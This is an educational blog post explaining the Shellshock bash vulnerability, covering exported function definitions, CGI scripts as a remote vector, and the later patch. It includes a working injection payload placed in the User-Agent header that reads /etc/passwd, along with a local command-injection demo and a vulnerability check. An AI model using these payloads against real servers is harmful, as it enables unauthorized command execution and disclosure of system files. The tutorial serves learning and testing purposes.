---
title: ShellShock - Diving Deep Into The Shock
tags: Shellshock Bash BashBug Shell CGI
article_header:
  type: 
  image:
   #src: 
sidebar: 
  nav: blogs
---

*If you think adding some random characters in the user-agent header gives you a shell is magic, it's time for you to understand the trick.*

## Introduction

Shellshock, also known as bash bug is a vulnerability in bash shell that exists due to how the bash shell processes environment variables when they are passed to a child process. When we refer to ShellShock, we refer to a class of vulnerabilities that occurs in bash shell.

Let's say we have a bash environment, where we want to create a function and call it whenever. we want to. We could do this in a standard bash format.

```bash
func() { echo "this is my function"; }
```

Now we can call this function, whenever we want. The problem with this method is accessibility i.e. we won't be able to call this function in any of the child process. We can try this using the following command.

```bash
func() { echo "this is my function"; } ; bash -c func
```

![t](/Images/shellshock/1.png){:.shadow}

We can overcome this problem with the help of environment variables. Environment variable are variables that contains information about our current shell. This includes,  paths, history size, prompt format etc. Now let's define the same function, but this time we'll make it an environment variable.

```bash
func='() { echo "this is my function"; }'
export func
```

The above command will create an environment variable called `func` with the function definition. Now whenever this parent process/our current shell, creates any other process, this function definition will be passed to the child process in form of environment variables.

![t](/Images/shellshock/2.png){:.shadow}

1. In first line we declare a function `func`
2. In second line we export it to make it an environment variable
3. In fifth line, we create a child process bash
4. In the sixth line, we can see the function has automatically been passed to child process and will be called, every time we type `func`.

We can see the function definition in by typing `env`.

![t](/Images/shellshock/3.png){:.shadow}

The way this environment variable function definition works is, when the environment variable function definition is passed to the child process, the child process first checks if the variable contains a function definition by searching for `() {`.

Once it finds a function definition, it simply replaces `=` with a blank space.

```bash
func='() { echo "this is my function"; }'
# After passing to child process becomes
func () { echo "this is my function"; }
```

Once the function is defined in the child process, we simply call it by it's name. Pretty simple.

## The Caveat 

Up until this point, everything looks normal, so how does `Shellshock` fit into picture and what's the bug here. Let's do a little experiment, let's define the the same function, but with a minor change.

```bash
func='() { echo "this is my function"; };id'
export func
```

Now create a child process

![t](/Images/shellshock/4.png){:.shadow}

Wait, did you notice something weird ? We did not call the function, but the command that we supplied is executed automatically as an individual command by the child process. The child process replaces `=` with a blank space, which completes the function definition, the next command is left unprocessed and is executed by the shell. Meaning, we can inject any command in the function definition environment variable and execute command on the target server i.e. `Shellshock`.

But what's the point of getting a code execution in your own terminal ? We need to find vectors through which we can remotely inject function definition into environment variables. This is where CGI scripts come into picture.

## Common Gateway Interface

Common Gateway Interface, commonly also known as CGI is an interface that allows the system to process data from a web server and supply it as arguments to a command line script to perform some operations and generate the dynamic response. These scripts can be written in perl, C, bash, ruby etc.

## CGI Script

A Common Gateway Interface Script, is the script which is executed by the server, when CGI is called. The way the data is supplied from web server to the CGI script, is through the help of environment variables eg: `QUERY_STRING`, `REMOTE_HOST`, `REQUEST_METHOD` etc.

Let's spin up a web server and run a CGI script that prints the environment variables.

Configuring Apache

```bash
# Add alias so /cg-bin/ resolves to /path/to/cgi-directory/ for script location
ScriptAlias /cgi-bin/ /path/to/cgi-directory/
<Directory /path/to/cgi-directory>
  Options +ExecCGI # enable execution of cgi scripts
  AddHandler cgi-script sh # execute only shell scripts
  AllowOverride None # overrride any other config, if there's a conflict
</Directory 
```

Our CGI Script

```bash
!#/bin/bash

echo "Content-Type: text/html"
echo ""
echo "<pre>"
/usr/bin/env
echo "</pre>"
```

Let's access the CGI script from our browser.

![t](/Images/shellshock/env-vars.png){:.shadow}

We can see all the environment variables passed to the CGI script, now if we want we can also access any of the environment variables from our CGI script, let's try to print the user-agent header.

```bash
#!/bin/bash

echo "Content-Type:  text/html"
echo ""
echo "<pre>"
echo "User Agent ->" $HTTP_USER_AGENT
echo "</pre>"
```

Save the cgi script and reload the page

![t](/Images/shellshock/user-agent.png){:.shadow}

## CGIS As Shock Vector

Now that we have a way to inject into environment variables remotely, let's put the pieces together and see the magic. Given that the remote server is running CGI scripts on a vulnerable version of bash, we can remotely inject system commands and get remote code execution on the target server. Let's understand the flow of execution first.

![t](/Images/shellshock/5.png){:.shadow}

1. The client calls the CGI script web server by visiting `https://vulnerable.com/cgi-bin/cgi.sh`
2. The server which is itself a process, create a child process where the cgi script is executed and passes all the information in environment variables.
3. Once the script executes, it prints out the output and the server sends it back to the client in response.

## Sending The Shock

Using the same old bash script that we are running, this time let's inject something interesting into the user agent header.

```bash
() { :; }; echo $(</etc/passwd)

# () -> defining a function with no name
# { } -> function body goes in here
# : -> a valid bash command
# ; -> specify end of command
# echo $(</etc/passwd) -> to display back the contents of /etc/passwd
```

Finally, let's send the request

![t](/Images/shellshock/data.png){:.shadow}

## Treating The Shock

Shellshock was first reported in 2014, [CVE-2014-6271][https://nvd.nist.gov/vuln/detail/cve-2014-6271], all versions of bash are vulnerable to Shellshock up until version 4.3. The latest version of bash is 5.2, since most of the systems are now running latest version of bash, it is less likely that you'll find this in the wild, as majority of the systems have already been patched. 

If we try to use the same payload that we used before to test shell shock, it won't work. Instead of replacing  `=` in function definition when passed to child process, bash now stores it into a variable instead i.e `BASH_FUNC_func%%`.

![t](/Images/shellshock/patched.png){:.shadow}

You can test you bash environment for Shellshock, by running the following command.

```bash
env x='() { :;}; echo Vulnerable' bash -c "echo Not Vulnerable"
# env : to set the environment variable x
# bash : to create a child process
```

I hope you enjoyed this exploration of Shellshock, stay tuned for more such deep dives, i have recently started a new venture called Surakshyaan, you can follow us on Instagram at @Surakshyaan and subscribe to our Youtube Channel at @Surakshyaan where we try to mix up some humour with cybersecurity.

*Stay Safe, Keep Hacking*




